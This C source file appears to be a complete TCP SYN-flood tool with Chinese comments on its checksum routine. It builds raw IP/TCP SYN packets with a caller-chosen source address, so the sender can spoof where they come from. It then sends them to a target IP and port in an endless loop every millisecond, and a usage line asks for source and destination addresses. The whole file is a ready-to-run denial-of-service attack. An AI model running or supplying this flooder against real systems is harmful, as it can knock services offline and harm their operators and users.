#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include "headers.h"

/**
 * 计算校验和
 * @param p    数据缓存区
 * @param len  数据长度(Byte)
 * @return     校验和
 */
uint16_t cksum(uint16_t *p, int len)
{
    uint32_t cksum = 0;
    uint16_t t = 0;

    // 以16bits为单位累加
    while (len > 1)
    {
        cksum += *p++;
        len -= 2;
    }
    // 如果数据的字节数为奇数, 将最后一个字节视为16bits的高8bits, 低8bits补0, 继续累加
    if (len == 1)
    {
        t = *(uint8_t *) p;
        cksum += t;
    }
    // cksum是32bits的int, 而校验和需为16bits, 需将cksum的高16bits加到低16bits上
    cksum = (cksum >> 16) + (cksum & 0xffff);
    // 按位求反
    return (~(uint16_t) cksum);
}

void make_syn_packet(char *packet, uint32_t saddr, uint32_t daddr, uint16_t sport, uint16_t dport)
{
    struct ip_header ih;
    struct tcp_header th;
    struct psd_header ph;
    uint8_t buff[sizeof(ph) + sizeof(th)];

    ih.ver_ihl = 0x45;
    ih.tos = 0;
    ih.tlen = htons(sizeof(ih) + sizeof(th));
    ih.id = 0;
    ih.flags_fo = 0;
    ih.ttl = 128;
    ih.proto = IPPROTO_TCP;
    ih.cksum = 0;
    ih.saddr = htonl(saddr);
    ih.daddr = htonl(daddr);

    th.sport = htons(sport);
    th.dport = htons(dport);
    th.seq = rand();
    th.ack = 0;
    th.lenres = (sizeof(th) / 4) << 4; // len = sizeof(tcp_header) / 4, res = 0
    th.flag = FLAG_SYN;
    th.win = htons(65535);
    th.cksum = 0;
    th.urp = 0;

    ph.saddr = ih.saddr;
    ph.daddr = ih.daddr;
    ph.proto = IPPROTO_TCP;
    ph.mbz = 0;
    ph.len = htons(sizeof(th));

    memcpy(buff, &ph, sizeof(ph));
    memcpy(buff + sizeof(ph), &th, sizeof(th));
    th.cksum = cksum((uint16_t *) buff, sizeof(buff));

    memcpy(packet, &ih, sizeof(ih));
    memcpy(packet + sizeof(ih), &th, sizeof(th));
}

int main(int argc, char **argv)
{
    int sockfd;
    struct sockaddr_in addr;
    uint32_t saddr, daddr;
    uint16_t sport, dport;
    char packet[sizeof(struct ip_header) + sizeof(struct tcp_header)];

    if (argc != 5)
    {
        printf("usage: %s <src-ip> <src-port> <dst-ip> <dst-port>\n", argv[0]);
        return 1;
    }
    saddr=inet_addr(argv[1]);
    daddr = inet_addr(argv[3]);
    sport = atoi(argv[2]);
    dport=atoi(argv[4]);

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0)
    {
        perror("socket");
        exit(1);
    }

    const int on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0)
    {
        perror("setsockopt");
        close(sockfd);
        exit(1);
    }

    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = daddr;
    addr.sin_port = htons(dport);

    for (;;)
    {
        usleep(1000);
        make_syn_packet(packet, htonl(saddr), htonl(daddr), sport, dport);

        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &addr, sizeof(addr)) < 0)
        {
            perror("sendto");
            close(sockfd);
            exit(1);
        }
    }
}
